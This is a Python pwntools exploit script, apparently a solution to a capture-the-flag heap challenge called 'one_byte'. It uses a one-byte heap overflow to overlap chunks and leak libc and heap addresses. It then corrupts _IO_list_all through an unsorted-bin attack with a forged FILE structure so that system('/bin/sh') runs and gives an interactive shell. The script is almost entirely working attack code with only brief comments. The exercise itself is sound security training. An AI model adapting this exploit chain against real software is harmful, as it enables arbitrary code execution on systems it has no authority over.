#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("one_byte")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option.
# Returns chunk index.
def malloc():
    global index
    io.sendthen(b"> ", b"1")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

# Select the "edit" option; send index & data.
def edit(index, data):
    io.send(b"3")
    io.sendafter(b"index: ", f"{index}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

# Select the "read" option; read 0x58 bytes.
def read(index):
    io.send(b"4")
    io.sendafter(b"index: ", f"{index}".encode())
    r = io.recv(0x58)
    io.recvuntil(b"> ")
    return r

io = start()
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================
chunk_A = malloc()
chunk_B = malloc()
chunk_C = malloc()
chunk_D = malloc()
chunk_E = malloc()

# overlap
edit(chunk_A, b'Y'*88 + p8(0xc1))

# leak libc
free(chunk_B)
chunk_B = malloc()

data = read(chunk_C)
unsortedbin_address = u64(data[:8])
info(f"unsortedbin_address -> {hex(unsortedbin_address)}")
libc.address = unsortedbin_address - 0x58 - libc.sym.main_arena
info(f"libc base -> {hex(libc.address)}")

# leak heap
chunk_C2 = malloc()
free(chunk_A)
free(chunk_C2)

heap = u64(read(chunk_C)[:8])
info(f"heap base -> {hex(heap)}")

# unsortedbin
chunk_C2 = malloc()
chunk_A = malloc()
edit(chunk_A, b"Y"*88 + p8(0xc1))
# edit(chunk_A, b"Y"*88 + p8(0x68))
free(chunk_B)
chunk_B = malloc()

# unsortedbin again and IO_File
edit(chunk_B, p64(0)*10 + b'/bin/sh\x00' + p8(0xb1))
edit(chunk_C, p64(0) + p64(libc.sym._IO_list_all - 0x10) + p64(1) + p64(2))
edit(chunk_E, p64(libc.sym.system) + p64(heap + 0x178))

malloc()

#  =============================================================================

io.interactive()
